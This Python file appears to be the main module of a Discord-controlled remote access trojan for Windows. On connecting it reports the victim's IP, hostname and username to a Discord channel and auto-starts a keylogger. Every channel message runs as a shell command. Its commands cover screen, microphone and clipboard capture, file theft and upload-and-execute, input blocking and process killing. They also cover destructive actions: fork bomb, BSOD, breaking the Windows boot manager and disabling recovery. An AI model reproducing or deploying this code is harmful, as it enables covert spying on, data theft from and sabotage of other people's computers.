import asyncio
import getpass
import json
import os
import re
import socket
from typing import cast

import discord
import requests
from discord import Interaction, TextChannel
from discord.ext import commands
from discord.ext.commands import Context

from src.cmd.clipboard import get_clipboard
from src.cmd.critical import set_critical, unset_critical
from src.cmd.delete_file import delete_file
from src.cmd.download_file import download_file
from src.cmd.file_browser import (
    change_directory,
    list_directory,
    show_pwd,
    show_tree,
)
from src.cmd.help import show_help
from src.cmd.implode import implode
from src.cmd.input_box import inputbox_show
from src.cmd.input_control import block_input, unblock_input
from src.cmd.keylogger import keylog_start, keylog_status, keylog_stop, start_keylogger
from src.cmd.keys import press_keys
from src.cmd.mic_recording import record_microphone_command
from src.cmd.monitors import set_monitors
from src.cmd.move_file import move_file
from src.cmd.msgbox import msgbox_show
from src.cmd.openurl import spawn_proc
from src.cmd.popup import popup_show
from src.cmd.processes import (
    blacklist_process,
    kill_process,
    list_blacklist,
    set_kill_reporter,
    show_foreground,
    show_processes,
    start_process_watchers,
    whitelist_process,
)
from src.cmd.read_file import read_file
from src.cmd.run_script import run_script_file
from src.cmd.runtime_control import clear_channel, restart_bot
from src.cmd.screen_display import display_image, play_glitch
from src.cmd.screen_recording import record_screen_command
from src.cmd.screenshot import take_screenshot
from src.cmd.shell import execute_cmd
from src.cmd.system import (
    break_windows,
    play_audio,
    set_recovery,
    set_volume,
    start_forkbomb,
    trigger_bsod,
)
from src.cmd.text_replacer import (
    active_rules,
    add_replacements,
    clear_replacements,
    current_replacer,
    remove_replacement,
    set_replacements,
    start_text_replacer,
    stop_text_replacer,
)
from src.cmd.transfer import execute_file, push_file
from src.cmd.upload_file import upload_file
from src.cmd.voice import voice_api
from src.cmd.voice_stream import join_voice, leave_voice
from src.cmd.wallpaper import set_wallpaper
from src.cmd.website_block import block_website, unblock_website
from src.constants import COMMAND_PREFIX, OWNER_ID, UPDATE_TAG, VERSION
from src.utils.updater import update_runtime
from src.utils.utils import send_text_in_chunks

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

channel = None
pc_user_name = "Unknown"
ip = "Unknown"

bot = commands.Bot(
    command_prefix=COMMAND_PREFIX,
    intents=intents,
    owner_id=OWNER_ID,
)

# The library ships a help command, the runtime has its own list of commands.
bot.remove_command("help")


def parse_json_object(raw: str) -> dict | None:
    """Parse a JSON object, returning None when the text is not one."""
    try:
        data = json.loads(raw)
    except ValueError:
        return None

    if not isinstance(data, dict):
        return None

    return data


@bot.event
async def on_ready():
    if not bot.user:
        raise ValueError("Bot user not found.")

    print(f"#- Logged in as {bot.user}!")
    await bot.tree.sync()
    print("i- Slash commands synced.")
    print("#- Connected Guilds:")
    for i, guild in enumerate(bot.guilds):
        print(f"[{i + 1}] {guild.name} (ID: {guild.id})")

    global channel
    global pc_user_name
    global ip

    guild = bot.guilds[0]
    response = await asyncio.to_thread(requests.get, "https://api.ipify.org")
    ip = response.text.replace(".", "-").strip()
    username = getpass.getuser()
    pc_name = socket.gethostname()
    cleaned_pc_name = re.sub(
        r"[^a-zA-Z0-9_-]",
        "",
        pc_name.strip().replace("/", "_").replace(" ", "-").lower(),
    )

    pc_user_name = f"{pc_name.strip()}/{username.strip()}"
    channel_name = f"{cleaned_pc_name}_{ip}"

    channel = next(
        (
            cast(TextChannel, existing_channel)
            for existing_channel in guild.channels
            if existing_channel.name == channel_name
        ),
        None,
    )

    if channel is None:
        channel = await guild.create_text_channel(channel_name)

    # The blacklister reports the processes it kills into the same channel.
    set_kill_reporter(
        lambda message: asyncio.run_coroutine_threadsafe(
            channel.send(message), bot.loop
        )
    )

    # A blacklist of a previous session is applied again right away.
    start_process_watchers()

    # The key logger runs from the start, the owner can stop it with the
    # keylog command.
    if start_keylogger() is not None:
        print("#- Key logger started.")

    connection_msg_string = f"""
======= User **CONNECTED** =======
*Username:* {pc_user_name}
*IP:* {ip.replace("-", ".")}
    """.strip()
    await channel.send(connection_msg_string)


@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return
    if not channel or message.channel.id != channel.id:
        return

    if (
        message.content.strip().lower() == "yes"
        or message.content.strip().lower() == "no"
    ):
        # The answers of the confirmation prompts are not commands.
        return

    if not message.content.startswith(str(bot.command_prefix)):
        # Every message that is not a command is run in the shell.
        message.content = f"{COMMAND_PREFIX}shell {message.content}"

    await bot.process_commands(message)


# ====================
# === HELP COMMAND ===
# ====================
@bot.command(name="help", description="Show the list of all commands.")
@commands.is_owner()
@commands.guild_only()
async def help_command(ctx: Context[commands.Bot]):
    await show_help(ctx)


# ====================
# === PING COMMAND ===
# ====================
@bot.command(name="ping", description="Check the bot's latency.")
@commands.is_owner()
@commands.guild_only()
async def ping(ctx: Context[commands.Bot], *, args: str | None):
    latency = round(bot.latency * 1000)  # latency in milliseconds

    if args and "-v" in args:
        await ctx.reply(
            f"Pong! 🏓 ({latency / 10}ms)\n**User:** {pc_user_name}\n**Version:** {VERSION}\n**Update Tag:** {UPDATE_TAG}"
        )
    else:
        await ctx.reply(f"Pong! 🏓 ({latency / 10}ms)")


# =========================
# === SHELL COMMAND ===
# =========================
@bot.command(
    name="shell",
    aliases=["cmd"],
    description="Run powershell commands",
)
@commands.is_owner()
@commands.guild_only()
async def shell(ctx: Context[commands.Bot], *, user_cmd: str | None):
    if not user_cmd:
        await ctx.reply(
            "⚠️ Please enter a command to execute\nUsage: `!shell <command>`"
        )
        return

    result = execute_cmd(user_cmd) or f'Executed "{user_cmd}" with no output'

    await send_text_in_chunks(ctx, result)


# ===========================
# === SCREENSHOT COMMAND ===
# ===========================
@bot.command(
    name="screenshot",
    aliases=["ss"],
    description="Capture the bot host's screen and upload it to this channel.",
)
@commands.is_owner()
@commands.guild_only()
async def screenshot(ctx: Context[commands.Bot]):
    await take_screenshot(ctx)


# ==============================
# === SCREEN RECORDING COMMAND ===
# ==============================
@bot.command(
    name="screenrec",
    description="Record the screen of the machine into a video.",
)
@commands.is_owner()
@commands.guild_only()
async def screenrec(ctx: Context[commands.Bot], seconds: str = "15"):
    await record_screen_command(ctx, parse_seconds(seconds))


# =========================
# === MICROPHONE COMMAND ===
# =========================
@bot.command(
    name="record",
    description="Record the microphone of the machine into a wav file.",
)
@commands.is_owner()
@commands.guild_only()
async def record(ctx: Context[commands.Bot], seconds: str = "60"):
    await record_microphone_command(ctx, parse_seconds(seconds))


# ===========================
# === DISPLAY COMMAND ===
# ===========================
@bot.command(
    name="display",
    description="Show an attachment fullscreen on the machine.",
)
@commands.is_owner()
@commands.guild_only()
async def display(ctx: Context[commands.Bot], seconds: str = "10"):
    await display_image(ctx, parse_seconds(seconds))


# ===========================
# === GLITCH COMMAND ===
# ===========================
@bot.command(name="glitch", description="Run a screen effect on the machine.")
@commands.is_owner()
@commands.guild_only()
async def glitch(ctx: Context[commands.Bot], effect: str, seconds: str = "5"):
    await play_glitch(ctx, effect, parse_seconds(seconds))


# ===========================
# === VOICE COMMAND ===
# ===========================
@bot.command(
    name="voice",
    aliases=["tts"],
    description="Speak text aloud using Windows text-to-speech.",
)
@commands.is_owner()
@commands.guild_only()
async def voice(ctx: Context[commands.Bot], *, text: str):
    await voice_api(ctx, text)


# ===========================
# === VOICE STREAM COMMAND ===
# ===========================
@bot.command(
    name="join",
    description="Stream the microphone of the machine into a voice channel.",
)
@commands.is_owner()
@commands.guild_only()
async def join(ctx: Context[commands.Bot]):
    await join_voice(ctx)


@bot.command(
    name="leave",
    description="Leave the voice channel of the microphone stream.",
)
@commands.is_owner()
@commands.guild_only()
async def leave(ctx: Context[commands.Bot]):
    await leave_voice(ctx)


# ===========================
# === OPENURL COMMAND ===
# ===========================
@bot.command(
    name="openurl", description="Open a URL in the Windows computer's default browser."
)
@commands.is_owner()
@commands.guild_only()
async def open_url(ctx: Context[commands.Bot], *, url: str):
    await spawn_proc(ctx, url)


# ===========================
# === UPLOAD COMMAND ===
# ===========================
@bot.command(
    name="upload",
    description="Download a file from an attachment or URL and upload it to Discord.",
)
@commands.is_owner()
@commands.guild_only()
async def upload(ctx: Context[commands.Bot], url: str | None = None):
    await upload_file(ctx, url)


# ================================
# === PUSH COMMAND ===
# ================================
@bot.command(
    name="push",
    aliases=["deploy"],
    description="Copy an attachment onto the machine.",
)
@commands.is_owner()
@commands.guild_only()
async def push(ctx: Context[commands.Bot], *, destination: str):
    await push_file(ctx, destination)


# ================================
# === EXECUTE COMMAND ===
# ================================
@bot.command(
    name="execute",
    description="Run a file that is already on the machine.",
)
@commands.is_owner()
@commands.guild_only()
async def execute(ctx: Context[commands.Bot], *, path: str):
    await execute_file(ctx, path)


# ================================
# === UPDATE APP COMMAND ===
# ================================
@bot.command(
    name="update_app",
    description="Update runtime.exe to the latest GitHub release and restart.",
)
@commands.is_owner()
@commands.guild_only()
async def update_app(ctx: Context[commands.Bot]):
    await update_runtime(ctx)


# ================================
# === TEXT REPLACER COMMAND ===
# ================================
@bot.command(
    name="replacer",
    description="Start, stop or check the live text replacer.",
)
@commands.is_owner()
@commands.guild_only()
async def replacer_command(ctx: Context[commands.Bot], *, action: str = "status"):
    action = action.lower()

    if action == "start":
        await start_text_replacer(ctx)
    elif action == "stop":
        await stop_text_replacer(ctx)
    else:
        instance = current_replacer()
        state = "running" if instance is not None and instance.running else "stopped"
        rules = active_rules()

        await ctx.reply(
            f"The text replacer is {state} with {len(rules)} rule(s).\n"
            + "\n".join(f"`{key}` -> `{value}`" for key, value in rules.items())
        )


@bot.command(
    name="replacements",
    description=(
        "Manage the text replacer rules: "
        '!replacements {"love": "hate"} sets them, '
        '!replacements add {"abc": "xyz"} adds them, '
        '!replacements rm "abc" removes one, '
        "!replacements del deletes the whole file."
    ),
)
@commands.is_owner()
@commands.guild_only()
async def replacements_command(ctx: Context[commands.Bot], *, args: str = ""):
    args = args.strip()

    if not args:
        await ctx.reply(
            'Usage: `!replacements {"love": "hate"}`, '
            '`!replacements add {"abc": "xyz"}`, '
            '`!replacements rm "abc"` or `!replacements del`.'
        )
        return

    action, _, rest = args.partition(" ")
    action = action.lower()
    rest = rest.strip()

    if action == "add":
        rules = parse_json_object(rest)

        if rules is None:
            await ctx.reply(
                'The rules must be a JSON object, for example {"abc": "xyz"}.'
            )
            return

        await add_replacements(ctx, rules)
        return

    if action == "rm":
        key = rest.strip('"').strip("'").strip()

        if not key:
            await ctx.reply(
                'Give the key of the rule to remove, e.g. `!replacements rm "abc"`.'
            )
            return

        await remove_replacement(ctx, key)
        return

    if action == "del":
        await clear_replacements(ctx)
        return

    rules = parse_json_object(args)

    if rules is None:
        await ctx.reply(
            'The rules must be a JSON object, for example {"love": "hate"}.'
        )
        return

    await set_replacements(ctx, rules)


# ===========================
# === DOWNLOAD COMMAND ===
# ===========================
@bot.command(
    name="download",
    aliases=["pull"],
    description="Resolve a file path and send the file to Discord.",
)
@commands.is_owner()
@commands.guild_only()
async def download(ctx: Context[commands.Bot], *, path: str):
    await download_file(ctx, path)


# ===========================
# === READ FILE COMMAND ===
# ===========================
@bot.command(
    name="read", description="Read a file from disk and send its contents as text."
)
@commands.is_owner()
@commands.guild_only()
async def read(ctx: Context[commands.Bot], *, path: str):
    await read_file(ctx, path)


# =============================
# === RUN SCRIPT COMMAND ===
# =============================
@bot.command(
    name="run_script",
    description="Save an attached Windows script (.ps1, .bat, ...) and run it.",
)
@commands.is_owner()
@commands.guild_only()
async def run_script(
    ctx: Context[commands.Bot], *, destination: str, source: str | None = None
):
    await run_script_file(ctx, destination, source)


# ===========================
# === DELETE COMMAND ===
# ===========================
@bot.command(name="delete", aliases=["remove"], description="Delete a file or a folder")
@commands.is_owner()
@commands.guild_only()
async def delete(ctx: Context[commands.Bot], *, path: str):
    await delete_file(bot, ctx, path)


# ===========================
# === MOVE FILE COMMAND ===
# ===========================
@bot.command(name="move", description="moves files and folders from <src> to <dest>")
@commands.is_owner()
@commands.guild_only()
async def move(ctx: Context[commands.Bot], *, paths: str):
    await move_file(ctx, paths)


# ===========================
# === CLEAR COMMAND ===
# ===========================
@bot.command(
    name="clear", description="Delete the messages that the runtime wrote here."
)
@commands.is_owner()
@commands.guild_only()
async def clear(ctx: Context[commands.Bot]):
    await clear_channel(ctx)


# ==============================
# === FILE BROWSER COMMANDS ===
# ==============================
@bot.command(name="pwd", description="Show the current folder of the file browser.")
@commands.is_owner()
@commands.guild_only()
async def pwd(ctx: Context[commands.Bot]):
    await show_pwd(ctx)


@bot.command(name="ls", description="List the content of the current folder.")
@commands.is_owner()
@commands.guild_only()
async def ls(ctx: Context[commands.Bot]):
    await list_directory(ctx)


@bot.command(name="cd", description="Change the folder of the file browser.")
@commands.is_owner()
@commands.guild_only()
async def cd(ctx: Context[commands.Bot], *, path: str):
    await change_directory(ctx, path)


@bot.command(name="tree", description="Show the structure of the current folder.")
@commands.is_owner()
@commands.guild_only()
async def tree(ctx: Context[commands.Bot], depth: str = "3"):
    await show_tree(ctx, parse_seconds(depth))


# ===========================
# === POPUP COMMAND ===
# ===========================
@bot.command(name="popup", description="Display a native windows popup msgbox")
@commands.is_owner()
@commands.guild_only()
async def popup(ctx: Context[commands.Bot], *, msg: str):
    await popup_show(ctx, msg)


# ===========================
# === MSGBOX COMMAND ===
# ===========================
@bot.command(
    name="msgbox",
    description="Display a native windows popup msgbox with custom buttons",
)
@commands.is_owner()
@commands.guild_only()
async def msgbox(ctx: Context[commands.Bot], *, args: str):
    await msgbox_show(ctx, args)


# ===========================
# === INPUTBOX COMMAND ===
# ===========================
@bot.command(name="inputbox", description="Display a native windows input form")
@commands.is_owner()
@commands.guild_only()
async def inputbox(ctx: Context[commands.Bot], *, prompt: str):
    await inputbox_show(ctx, prompt)


# ===========================
# === SHUTDOWN COMMAND ===
# ===========================
@bot.command(name="shutdown", description="shutdown PC immediately")
@commands.is_owner()
@commands.guild_only()
async def shutdown(ctx: Context[commands.Bot], timeout: str = "0"):
    timeout_seconds = parse_seconds(timeout)

    shutdown_cmd = r"shutdown /s /t " + str(timeout_seconds)
    result = execute_cmd(shutdown_cmd) or f"PC about to shutdown in {timeout_seconds}s"
    await ctx.reply(result)


# ===========================
# === RESTART COMMAND ===
# ===========================
@bot.command(name="restart", description="restart PC immediately")
@commands.is_owner()
@commands.guild_only()
async def restart(ctx: Context[commands.Bot], timeout: str = "0"):
    timeout_seconds = parse_seconds(timeout)

    shutdown_cmd = r"shutdown /r /t " + str(timeout_seconds)
    result = execute_cmd(shutdown_cmd) or f"PC about to restart in {timeout_seconds}s"
    await ctx.reply(result)


# ===========================
# === RESTART BOT COMMAND ===
# ===========================
@bot.command(name="restart_bot", description="Restart the runtime itself.")
@commands.is_owner()
@commands.guild_only()
async def restart_bot_command(ctx: Context[commands.Bot]):
    await restart_bot(ctx)


# ===========================
# === EXIT COMMAND ===
# ===========================
@bot.command(name="exit", description="Stop the runtime process.")
@commands.is_owner()
@commands.guild_only()
async def exit_command(ctx: Context[commands.Bot]):
    await ctx.reply(
        "⚠️ Are you sure you want to stop the runtime? "
        "Reply `yes` to confirm or `no` to cancel."
    )

    def check(message: discord.Message) -> bool:
        return (
            message.author.id == ctx.author.id
            and message.channel.id == ctx.channel.id
            and message.content.lower().strip() in ("yes", "no")
        )

    try:
        response = await bot.wait_for("message", check=check, timeout=30)
    except TimeoutError:
        await ctx.reply("The runtime keeps running, the confirmation timed out.")
        return

    if response.content.lower().strip() != "yes":
        await ctx.reply("The runtime keeps running.")
        return

    await ctx.reply("The runtime stops now.")
    await asyncio.sleep(1)
    os._exit(0)


# ===========================
# === WALLPAPER COMMAND ===
# ===========================
@bot.command(name="wallpaper", description="Sets the wallpaper of the image provided")
@commands.is_owner()
@commands.guild_only()
async def wallpaper(ctx: Context[commands.Bot]):
    await set_wallpaper(ctx)


# ===========================
# === CLIPBOARD COMMAND ===
# ===========================
@bot.command(name="clipboard", description="Gets content from users clipboard")
@commands.is_owner()
@commands.guild_only()
async def clipboard(
    ctx: Context[commands.Bot], action: str = "read", *, text: str | None = None
):
    await get_clipboard(ctx, action, text or "")


# ===========================
# === PROCESS COMMANDS ===
# ===========================
@bot.command(
    name="ps",
    aliases=["processes"],
    description="List the processes that run on the machine.",
)
@commands.is_owner()
@commands.guild_only()
async def ps(ctx: Context[commands.Bot]):
    await show_processes(ctx)


@bot.command(
    name="show",
    description="Show information about the machine, only the processes so far.",
)
@commands.is_owner()
@commands.guild_only()
async def show(ctx: Context[commands.Bot], *, what: str = "processes"):
    if what.strip().lower() != "processes":
        await ctx.reply("Usage: `!show processes`")
        return

    await show_processes(ctx)


@bot.command(
    name="kill", description="Kill a process by name or by the number of the listing."
)
@commands.is_owner()
@commands.guild_only()
async def kill(ctx: Context[commands.Bot], *, target: str):
    await kill_process(ctx, target)


@bot.command(
    name="foreground", description="Show the process of the foreground window."
)
@commands.is_owner()
@commands.guild_only()
async def foreground(ctx: Context[commands.Bot]):
    await show_foreground(ctx)


@bot.command(name="blacklist", description="Kill a process again as soon as it starts.")
@commands.is_owner()
@commands.guild_only()
async def blacklist(ctx: Context[commands.Bot], *, name: str = ""):
    if not name.strip():
        await list_blacklist(ctx)
        return

    await blacklist_process(ctx, name)


@bot.command(name="whitelist", description="Remove a process from the blacklist.")
@commands.is_owner()
@commands.guild_only()
async def whitelist(ctx: Context[commands.Bot], *, name: str):
    await whitelist_process(ctx, name)


# ===========================
# === INPUT COMMANDS ===
# ===========================
@bot.command(name="block-input", description="Block the keyboard and the mouse.")
@commands.is_owner()
@commands.guild_only()
async def block_input_command(ctx: Context[commands.Bot]):
    await block_input(ctx)


@bot.command(name="unblock-input", description="Unblock the keyboard and the mouse.")
@commands.is_owner()
@commands.guild_only()
async def unblock_input_command(ctx: Context[commands.Bot]):
    await unblock_input(ctx)


@bot.command(name="keys", description="Type on the machine, ALTF4 and ALTTAB work too.")
@commands.is_owner()
@commands.guild_only()
async def keys(ctx: Context[commands.Bot], *, keys_to_press: str):
    await press_keys(ctx, keys_to_press)


# ===========================
# === KEYLOGGER COMMAND ===
# ===========================
@bot.command(
    name="keylog",
    description="Start, stop or check the key logger of the machine.",
)
@commands.is_owner()
@commands.guild_only()
async def keylog(ctx: Context[commands.Bot], action: str = "status"):
    action = action.strip().lower()

    if action == "start":
        await keylog_start(ctx)
    elif action == "stop":
        await keylog_stop(ctx)
    else:
        await keylog_status(ctx)


# ===========================
# === CRITICAL COMMAND ===
# ===========================
@bot.command(
    name="critical",
    aliases=["set-critical", "unset-critical"],
    description="Raise or lower the critical status of the runtime.",
)
@commands.is_owner()
@commands.guild_only()
async def critical(ctx: Context[commands.Bot], action: str = "status"):
    action = action.strip().lower()

    if action in ("set", "on", "enable"):
        await set_critical(ctx)
    elif action in ("unset", "off", "disable"):
        await unset_critical(ctx)
    else:
        await ctx.reply("Usage: `!critical set` or `!critical unset`.")


# ===========================
# === MONITOR COMMAND ===
# ===========================
@bot.command(name="monitors", description="Turn the monitors of the machine on or off.")
@commands.is_owner()
@commands.guild_only()
async def monitors(ctx: Context[commands.Bot], state: str = "on"):
    await set_monitors(ctx, state)


# ===========================
# === WEBSITE COMMANDS ===
# ===========================
@bot.command(name="block-website", description="Block a website with the hosts file.")
@commands.is_owner()
@commands.guild_only()
async def block_website_command(ctx: Context[commands.Bot], *, url: str):
    await block_website(ctx, url)


@bot.command(name="unblock-website", description="Unblock a website of the hosts file.")
@commands.is_owner()
@commands.guild_only()
async def unblock_website_command(ctx: Context[commands.Bot], *, url: str):
    await unblock_website(ctx, url)


# ===========================
# === SYSTEM COMMANDS ===
# ===========================
@bot.command(
    name="volume", description="Set the volume of the speakers of the machine."
)
@commands.is_owner()
@commands.guild_only()
async def volume(ctx: Context[commands.Bot], level: str):
    await set_volume(ctx, level)


@bot.command(name="play", description="Play a wav, mp3 or midi file on the machine.")
@commands.is_owner()
@commands.guild_only()
async def play(ctx: Context[commands.Bot], *, path: str):
    await play_audio(ctx, path)


@bot.command(name="forkbomb", description="Start a fork bomb, the machine will freeze.")
@commands.is_owner()
@commands.guild_only()
async def forkbomb(ctx: Context[commands.Bot]):
    await start_forkbomb(ctx)


@bot.command(name="bsod", description="Trigger a blue screen of death on the machine.")
@commands.is_owner()
@commands.guild_only()
async def bsod(ctx: Context[commands.Bot]):
    await trigger_bsod(ctx)


@bot.command(name="break-windows", description="Rename the boot manager of Windows.")
@commands.is_owner()
@commands.guild_only()
async def break_windows_command(ctx: Context[commands.Bot]):
    await break_windows(ctx)


@bot.command(
    name="disable-reset", description="Disable the Windows recovery environment."
)
@commands.is_owner()
@commands.guild_only()
async def disable_reset(ctx: Context[commands.Bot]):
    await set_recovery(ctx, False)


@bot.command(
    name="enable-reset", description="Enable the Windows recovery environment."
)
@commands.is_owner()
@commands.guild_only()
async def enable_reset(ctx: Context[commands.Bot]):
    await set_recovery(ctx, True)


# ===========================
# === IMPLODE COMMAND ===
# ===========================
@bot.command(name="implode", description="Remove the runtime from the machine.")
@commands.is_owner()
@commands.guild_only()
async def implode_command(ctx: Context[commands.Bot]):
    await implode(ctx)


# ===========================
# === LIST DEVICES COMMAND ===
# ===========================
@bot.tree.command(name="list_devices", description="Lists all connected devices")
@commands.is_owner()
@commands.guild_only()
async def list_devices(interaction: Interaction):
    latency = round(bot.latency * 1000)  # latency in milliseconds
    await interaction.response.send_message(
        f"- **User:** {pc_user_name}\t**IP:** {ip.replace('-', '.')}\t*Latency:* {latency / 10}ms"
    )


def parse_seconds(value: str) -> int:
    """Turn the argument of a command into a number of seconds."""
    try:
        return int(str(value).strip())
    except TypeError, ValueError:
        return 0
